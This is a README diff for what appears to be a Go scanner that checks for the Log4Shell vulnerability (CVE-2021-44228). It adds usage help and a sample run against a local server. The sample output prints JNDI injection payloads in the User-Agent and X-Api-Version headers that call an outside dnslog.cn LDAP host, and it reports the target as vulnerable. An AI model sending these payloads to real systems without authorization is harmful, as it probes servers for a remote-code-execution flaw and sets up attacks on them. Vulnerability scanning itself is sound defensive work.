@@ -2,7 +2,14 @@
 
 
 ```bash
-$ go run main.go http://127.0.0.1:8080/
+$ go run main.go --help
+Usage of main:
+  -mode string
+        a string (default "[urlpath, header, useragent]")
+  -url string
+        a string (default "url")
+
+$ go run main.go -mode=useragent -url=http://127.0.0.1:8080
 [+++] Your domain generated :  rfcbd0.dnslog.cn
 [+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
 [***] Payload :  User-Agent:${jndi:ldap://rfcbd0.dnslog.cn/}
@@ -28,5 +35,4 @@ $ go run main.go http://127.0.0.1:8080/
 [***] Payload :  X-Api-Version:${jndi:ldap://rfcbd0.dnslog.cn/}
 [***] DNS log result :  [["rfcbd0.dnslog.cn","172.253.238.4","2021-12-16 14:45:19"]]
 [***] Is Vulnerability to CVE-2021-44228 - [critical]
-
 ```
